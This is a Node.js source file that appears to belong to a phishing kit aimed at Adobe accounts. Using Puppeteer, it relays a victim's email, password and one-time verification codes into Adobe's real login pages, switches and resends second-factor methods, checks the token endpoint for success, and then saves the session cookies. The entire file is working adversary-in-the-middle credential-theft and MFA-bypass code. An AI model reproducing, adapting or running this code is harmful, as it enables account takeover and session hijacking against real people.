const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let email = "#EmailPage-EmailField"
                await page.waitForSelector(email)

                await page.evaluate((email) => {
                    document.querySelector(email).value = ""
                    document.querySelector(email).setAttribute("value", "")
                }, email)

                await page.type(email, this.email)
                await page.click(`[data-id="EmailPage-ContinueButton"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 2000))
            }

        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            [
                "Welcome to your account,",
                "account-profile-image",
                "Your account"
            ]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            console.log(body)
            const spikeType = body["spikeType"]

            if (spikeType == "home-email") {
                let email = "#EmailPage-EmailField"
                await page.waitForSelector(email)

                await page.evaluate((email) => {
                    document.querySelector(email).value = ""
                    document.querySelector(email).setAttribute("value", "")
                }, email)

                await page.type(email, body.username)
                await page.click(`[data-id="EmailPage-ContinueButton"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 2000))
            } else if (spikeType == "home-password") {
                let password = "#PasswordPage-PasswordField"
                await page.waitForSelector(password)

                await page.evaluate((password) => {
                    document.querySelector(password).value = ""
                    document.querySelector(password).setAttribute("value", "")
                }, password)

                await page.type(password, body.password)
                await page.click(`[data-id="PasswordPage-ContinueButton"]`)

                let checkResult = false
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr"
                        || response.request().resourceType() == "fetch"
                        && response.request().url().startsWith("https://auth.services.adobe.com/signin/v2/tokens")
                    ) {
                        const contentType = response.headers()['content-type']
                        if (contentType && contentType.includes("application/json")) {
                            const data = await response.json()
                            if (!data.hasOwnProperty('errorCode') || !data.hasOwnProperty("errorMessage")) {
                                checkResult = true
                            }

                            await new Promise(re => setTimeout(re, 2000))
                            return true
                        }
                    }
                })

                if (checkResult) { await page.waitForNavigation({ waitUntil: "networkidle0" }) }
            } else if (spikeType == "auth-type") {
                await page.evaluate(() => {
                    const allAuthBtns = document.querySelectorAll(`[class="ActionList-Item"]`)
                    allAuthBtns.forEach((btn, index) => {
                        btn.setAttribute("spike-auth-btn", index)
                    })
                })

                const currentbtn = `[spike-auth-btn="${body.spikeAuth}"]`
                await page.waitForSelector(currentbtn)
                await page.click(currentbtn)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 3000))
            } else if (spikeType == "select-other-auth") {
                await page.evaluate(() => {
                    document.querySelectorAll("a").forEach(btn => {
                        if (btn.innerText.includes(`Use another method to receive the code`)) {
                            btn.setAttribute("spike-other-btn", true)
                        }
                    })
                })

                await page.waitForSelector(`[spike-other-btn="true"]`)
                await page.click(`[spike-other-btn="true"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        await new Promise(re => setTimeout(re, 3000))
                        return true
                    }
                })
            } else if (spikeType == "verify-code") {
                for (let index = 0; index < 6; index++) {
                    let selInp = `[data-id="CodeInput-${index}"]`
                    await page.waitForSelector(selInp)
                    await page.type(selInp, body.otp_code[index])
                }

                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        await new Promise(re => setTimeout(re, 3000))
                        return true
                    }
                })
            } else if (spikeType == "resend-code") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (
                            btn.innerText.includes("Didn't receive your code?")
                            || btn.innerText.includes(`Resend Code`)
                        ) {
                            btn.setAttribute("spike-resend-btn", true)
                        }
                    })
                })

                await page.waitForSelector(`[spike-resend-btn="true"]`)
                await page.click(`[spike-resend-btn="true"]`)
                await new Promise(re => setTimeout(re, 2000))
            } else if (spikeType == "verify-btn") {
                await page.waitForSelector(`[name="submit"]`)
                await page.click(`[name="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 2000))
            } else if (spikeType == "change-auth-type") {
                await page.evaluate(() => {
                    document.querySelectorAll('a').forEach(atag => {
                        if (atag.innerText.includes("Use another method to receive the code")) {
                            atag.click()
                        }
                    })
                })
                await new Promise(re => setTimeout(re, 2000))
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }